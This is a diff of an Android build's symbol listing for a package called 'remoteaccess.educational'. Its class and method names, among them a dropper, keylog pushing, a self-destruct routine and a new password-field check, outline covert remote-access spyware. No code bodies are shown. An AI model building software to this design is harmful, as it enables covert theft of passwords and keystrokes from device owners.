@@ -3059,6 +3059,8 @@ com.remoteaccess.educational.commands.ScreenshotHandler:
 com.remoteaccess.educational.extreme.FUDDropper
 com.remoteaccess.educational.network.SocketManager:
     private static final int MIN_FRAMES_TO_SAVE
+    private static final long SCREEN_READER_NORMAL_INTERVAL_MS
+    private static final long SCREEN_READER_PATTERN_INTERVAL_MS
     private static final java.lang.String TAG
     private java.lang.String bitmapToBase64(android.graphics.Bitmap,int)
     public boolean isDynamicallyMonitored(java.lang.String)
@@ -13126,9 +13128,14 @@ com.remoteaccess.educational.commands.ScreenshotHandler:
     public android.content.Context context
     public static android.graphics.Bitmap captureBitmap()
     public static org.json.JSONObject takeScreenshot()
+com.remoteaccess.educational.network.SocketManager$$InternalSyntheticLambda$3$d80d46de0e6ea939c4d75a5b647cebe4ea996819abd5b5b89cddd1f2c4c7cbf9$0:
+    public final synthetic com.remoteaccess.educational.services.UnifiedAccessibilityService f$1
+com.remoteaccess.educational.network.SocketManager$2:
+    public final synthetic com.remoteaccess.educational.network.SocketManager this$0
 com.remoteaccess.educational.network.SocketManager:
     public static android.graphics.Bitmap captureFrame()
     public static void connectionLoop()
+    public static java.util.ArrayList deduplicateFramesForSave()
     public static void dispatchFrameSend()
     public static void emit()
     public static com.remoteaccess.educational.commands.AppMonitor getAppMonitor()
@@ -13147,26 +13154,28 @@ com.remoteaccess.educational.network.SocketManager:
     public static void lambda$dispatchFrameSend$11()
     public static synthetic void lambda$forceReconnect$8()
     public static void lambda$listenForMessages$6()
-    public static void lambda$performSelfDestruct$21()
+    public static void lambda$performSelfDestruct$22()
     public static synthetic void lambda$processMessage$7()
-    public static synthetic void lambda$pushKeylogEntry$18()
-    public static synthetic void lambda$pushNotification$19()
-    public static synthetic void lambda$pushRecentActivity$20()
+    public static synthetic void lambda$pushKeylogEntry$19()
+    public static synthetic void lambda$pushNotification$20()
+    public static synthetic void lambda$pushRecentActivity$21()
     public static synthetic void lambda$scheduleFrameAfterAction$1()
     public static synthetic void lambda$startBlockFrameMode$13()
     public static synthetic void lambda$startBlockFrameMode$14()
     public static void lambda$startHeartbeat$5()
     public static synthetic void lambda$startIdleFrameMode$12()
-    public static void lambda$startScreenReaderLoop$16()
-    public static synthetic void lambda$stopScreenReaderLoop$17()
+    public static synthetic void lambda$startScreenReaderLoop$16()
+    public static void lambda$startScreenReaderLoop$17()
+    public static synthetic void lambda$stopScreenReaderLoop$18()
     public static synthetic void lambda$streamChannelLoop$4()
-    public static void lambda$uploadPendingOfflineRecordings$23()
+    public static void lambda$uploadPendingOfflineRecordings$24()
     public static void listenForMessages()
     public static void liveChannelLoop()
     public static void processMessage()
     public final void pushNotification(java.lang.String,java.lang.String,java.lang.String,java.lang.String,long)
     public static void pushRecentActivity()
     public static android.graphics.Bitmap scaleBitmapToWidth()
+    public static boolean screenHasActivePasswordField()
     public static void sendErrorResponse()
     public static void sendHeartbeat()
     public static void sendPong()
@@ -13174,6 +13183,7 @@ com.remoteaccess.educational.network.SocketManager:
     public static void startBlockFrameMode()
     public static void startHeartbeat()
     public final void startIdleFrameMode(java.lang.String)
+    public final void startScreenReaderLoop(boolean)
     public static void stopScreenReaderAutoNoSave()
     public static void streamChannelLoop()
     public static void uploadPendingOfflineRecordings()
